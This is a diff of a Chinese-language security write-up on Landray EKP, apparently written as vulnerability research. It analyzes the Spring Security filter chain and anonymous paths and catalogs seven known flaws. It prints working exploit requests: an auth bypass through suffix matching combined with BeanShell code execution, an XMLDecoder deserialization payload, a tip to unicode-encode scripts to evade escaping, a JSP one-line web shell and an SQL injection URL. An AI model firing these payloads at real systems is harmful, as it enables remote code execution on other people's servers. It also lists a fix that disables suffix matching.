@@ -104,16 +104,69 @@ KmsKcubeTmplCfg.hbm.xml内容如下
 ### 路由分析
 *   （1）jsp路由为jsp所在位置到ekp目录之前的相对路径，例如`/ekp/sys/common/dataxml.jsp`
 *   （2）Controller访问路由，Controller命名为`xxController`、`xxAction`，可以在每个功能目录的`actions`文件夹下查找。然后在KmssConfig文件夹该功能对应的配置文件spring-mvc.xml（有些版本蓝凌用的struts.xml）中查找类与jsp的对应关系，和类的访问路径。
-
-
-### 安全管理
-SpringSecurity配置。`/ekp/WEB-INF/KmssConfig/sys`文件夹下有两个关于SpringSecurity的配置——Authentication（认证）和Authorization（授权）文件夹
+*   （3）安全管理用了SpringSecurity。web.xml中配置了SpringSecurity的一个Filter，相关定义位于`sys\authentication\spring.xml`。`/ekp/WEB-INF/KmssConfig/sys`下实际存在两个关于SpringSecurity的配置——Authentication（认证）和Authorization（授权）文件夹
 ```
     <filter>
         <!-- 'springSecurityFilterChain' is a bean ID that declared in sys\authentication\spring.xml  -->  
         <filter-name>springSecurityFilterChain</filter-name>  
         <filter-class>com.landray.kmss.web.filter.SpringSecurityFilterToBeanProxy</filter-class>  
     </filter> 
+```
+Authentication下的spring.xml，Bean对象的name为`springSecurityFilterChain`和Filter的配置相对应。静态资源通过resourceCacheFilter。其他的资源要通过xml文件中列出的六个Filter
+```xml
+<bean id="org.springframework.security.filterChainProxy" 
+        name="springSecurityFilterChain"
+        class="org.springframework.security.web.FilterChainProxy">
+        <constructor-arg>
+             <list value-type="org.springframework.security.web.SecurityFilterChain">
+                <!-- 静态资源，加有效期|版本号 -->
+                <sec:filter-chain pattern="/**/*.gif" filters="resourceCacheFilter" />
+                <sec:filter-chain pattern="/**/*.jpg" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.png" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.bmp" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.ico" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.css" filters="resourceCacheFilter,gzipFilter" />
+                <sec:filter-chain pattern="/**/*.js" filters="resourceCacheFilter,gzipFilter" />  
+                <sec:filter-chain pattern="/**/*.tmpl" filters="resourceCacheFilter,gzipFilter" />  
+                <sec:filter-chain pattern="/**/*.html" filters="gzipFilter" />
+                <!-- RestApi的过滤，由于使用不同的认证方式和非会话管理，所以独立一条链路 restApiAuthFilter-->
+                <sec:filter-chain pattern="/api/**" filters="restApiAuthFilter" />
+                <!-- 其它资源 kmssSessionManagerFilter -->
+		<!-- 操作日志过滤器sysLogOperFilter、 -->
+                <sec:filter-chain  pattern="/**"
+                    filters="securityContextPersistenceFilter,
+                    sysLogOperFilter, 
+                    concurrentSessionFilter,
+                    kmssProcessingFilterProxy,
+                    exceptionTranslationFilter,
+                    filterInvocationInterceptor" />
+             </list>
+         </constructor-arg>
+</bean>
+```
+filterInvocationInterceptor中也定义了一些匿名路径
+```
+/login*.jsp*; 
+/resource/**; 
+/service/**; 
+/ui-ext/**; 
+/*/*.index; 
+/logout*; 
+/admin.do*; 
+/browser.jsp*;
+/axis/*; 
+/kk*; 
+/forward.html*; 
+/sys/webservice/*; 
+/vcode.jsp;
+/sys/authentication/validate*;
+/ui-ext/scormcourse/**;
+/*.txt;
+/sys/print/word/file/**;
+/elec/rmkk/rmkk.do*;
+/elec/yqq/callback.do*;
+/sys/person/image.jsp*;
+/elec/sgt/callback.do*;
 ```
 
 ## 已知漏洞
@@ -123,7 +176,22 @@ SpringSecurity配置。`/ekp/WEB-INF/KmssConfig/sys`文件夹下有两个关于S
  - [4.jsp未授权访问漏洞](#jsp未授权访问)
  - [5.XMLdecoder反序列化漏洞](#xmldecoder反序列化)
  - [6.debug.jsp写文件漏洞](#debug_jsp写文件)
- - [7.kmImeetingRes.do sql注入漏洞](#sql注入)
+ - [7.kmImeetingRes.do sql注入漏洞](#kmimeetingres_sql注入)
+
+
+|漏洞名称|访问路径|漏洞定位|
+|:---:|:---:|:---:|
+|custom.jsp文件读取漏洞|`/ekp/sys/ui/extend/varkind/custom.jsp`|由jsp `<c:import>`引起的SSRF|
+|admin.do jndi漏洞|`/ekp/admin.do`|——|
+|BeanShell漏洞|`/ekp/sys/common/dataxml.jsp`等|`FormulaParser#parseValueScript`|
+|jsp未授权访问漏洞|`/ekp/data/sys-common/dataxml.js`|`/sys/authentication/spring.xml`|
+|XMLdecoder反序列化漏洞|`/sys/search/sys_search_main/sysSearchMain.do?method=editParam`|`/util/ObjectXML.class`|
+|debug.jsp写文件漏洞|`/ekp/sys/common/debug.jsp`|直接将接收参数写入到了code.jsp|
+|kmImeetingRes.do sql注入漏洞|`/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do`|——|
+
+
+
+
 
 ### custom文件读取
 custom.jsp文件内容如下
@@ -262,45 +330,66 @@ var={"body":{"file":"/sys/common/dataxml.jsp"}}&s_bean=sysFormulaValidate&script
 ```
 /tic/core/resource/js/erp_data.jsp
 ```
+数据包script的内容可以将恶意代码进行unicode转码，防止字符被转译。
+
 
 
 ### jsp未授权访问
-BeanShell攻击中用到的jsp文件都是需要访问权限的，其访问路径均为`/sys/common/xx.jsp`，对应的配置文件为`/ekp/WEB-INF/KmssConfig/sys/authentication/spring.xml`，部分内容如下，可以看到对于sys目录下的静态文件，都采用resourceCacheFilter进行过滤，但是该过滤器没有权限校验过程
-```xml
-    <bean id="org.springframework.security.filterChainProxy" 
-        name="springSecurityFilterChain"
-        class="org.springframework.security.web.FilterChainProxy">
-        <constructor-arg>
-             <list value-type="org.springframework.security.web.SecurityFilterChain">
-                <sec:filter-chain pattern="/**/*.gif" filters="resourceCacheFilter" />
-                <sec:filter-chain pattern="/**/*.jpg" filters="resourceCacheFilter" />  
-                <sec:filter-chain pattern="/**/*.png" filters="resourceCacheFilter" />  
-                <sec:filter-chain pattern="/**/*.bmp" filters="resourceCacheFilter" />  
-                <sec:filter-chain pattern="/**/*.ico" filters="resourceCacheFilter" />  
-                <sec:filter-chain pattern="/**/*.css" filters="resourceCacheFilter,gzipFilter" />
-                <sec:filter-chain pattern="/**/*.js" filters="resourceCacheFilter,gzipFilter" />  
-                <sec:filter-chain pattern="/**/*.tmpl" filters="resourceCacheFilter,gzipFilter" />  
-                <sec:filter-chain pattern="/**/*.html" filters="gzipFilter" />
-                <sec:filter-chain pattern="/api/**" filters="restApiAuthFilter" />                
-                <!-- 其它资源 kmssSessionManagerFilter -->
-                <sec:filter-chain  pattern="/**"
-                    filters="securityContextPersistenceFilter,
-                    sysLogOperFilter,
-                    concurrentSessionFilter,
-                    kmssProcessingFilterProxy,
-                    exceptionTranslationFilter,
-                    filterInvocationInterceptor" />
-             </list>
-         </constructor-arg>
-    </bean>
-```
+BeanShell攻击中用到的jsp文件都是需要访问权限的，其访问路径均为`/ekp/sys/common/xx.jsp`，对应的配置文件为`/ekp/WEB-INF/KmssConfig/sys/authentication/spring.xml`，具体内容可以看文章安全管理部分。对于`.gif .jpg .png .bmp .ico .css .js .tmpl .html`这些静态资源都采用resourceCacheFilter进行过滤，但是该过滤器没有权限校验过程。所以可以访问静态资源来绕过权限校验。但是为什么dataxml.jsp可以通过dataxml.js来访问？
+
+主要由于Spring的useSuffixPatternMatch机制。该值默认为true，会启用后缀模式匹配，假如一个Controller映射的是`/user`，那么Spring在开启useSuffixPatternMatch机制时，会匹配`/users.*`。Spring对于useSuffixPatternMatch的处理过程展开如下
+<details>
+    <summary>useSuffixPatternMatch处理位置</summary>
+    <pre>
+    <code>
+private String getMatchingPattern(String pattern, String lookupPath) { // PatternsRequestCondition类
+    if (pattern.equals(lookupPath)) {
+        return pattern;
+    }　　　　
+    if (this.useSuffixPatternMatch) {//useSuffixPatternMatch默认为true
+        if (!this.fileExtensions.isEmpty() && lookupPath.indexOf('.') != -1) {
+	    for (String extension : this.fileExtensions) {
+	        if (this.pathMatcher.match(pattern + extension, lookupPath)) {
+		    return pattern + extension;
+	        }
+	    }
+        }
+        else {
+	    boolean hasSuffix = pattern.indexOf('.') != -1;
+	    if (!hasSuffix && this.pathMatcher.match(pattern + ".*", lookupPath)) {
+	        return pattern + ".*"; //这里返回了login.*
+	    }
+        }
+    }
+    if (this.pathMatcher.match(pattern, lookupPath)) {
+        return pattern;
+    }
+    if (this.useTrailingSlashMatch) {
+        if (!pattern.endsWith("/") && this.pathMatcher.match(pattern + "/", lookupPath)) {
+	    return pattern +"/";
+        }
+    }
+    return null;
+}
+    </code>
+    </pre>
+</details>
+ 
+
 所以可以不通过custom.jsp的方式来访问这些jsp，可以采用更改jsp文件后缀的方式，例如想要访问dataxml.jsp，可以将其改为访问dataxml.js或者dataxml.tmpl等方式
 ```
-POST /data/sys-common/dataxml.js HTTP/1.1
+POST /ekp/data/sys-common/dataxml.js HTTP/1.1
 Host: test.com
 Content-Type: application/x-www-form-urlencoded
 
 s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc.exe");
+```
+Ps: 如果要关闭后缀匹配，可以配置如下
+```xml
+<mvc:annotation-driven>
+     <!-- 是否在匹配模式时使用后缀模式匹配(" .*") 如果启用了映射到“/users”的方法，则匹配到“/users.*”。默认为true-->
+      <mvc:path-matching suffix-pattern="false" />
+</mvc:annotation-driven>
 ```
 
 ### xmldecoder反序列化
@@ -332,6 +421,13 @@ Object o = xmlDecoder.readObject();
 	</property>
 </bean>
 ```
+攻击数据包如下
+```
+POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void class="bsh.Interpreter"><void method="eval"><string>Runtime.getRuntime().exec("calc");</string></void></void></java>
+```
 
 
 ### debug_jsp写文件
@@ -352,7 +448,7 @@ Java最简单的一句话木马如下，现在debug.jsp提供了木马两侧的�
 <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
 ```
 
-### sql注入
+### kmimeetingres_sql注入
 ```
 /ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
 ```
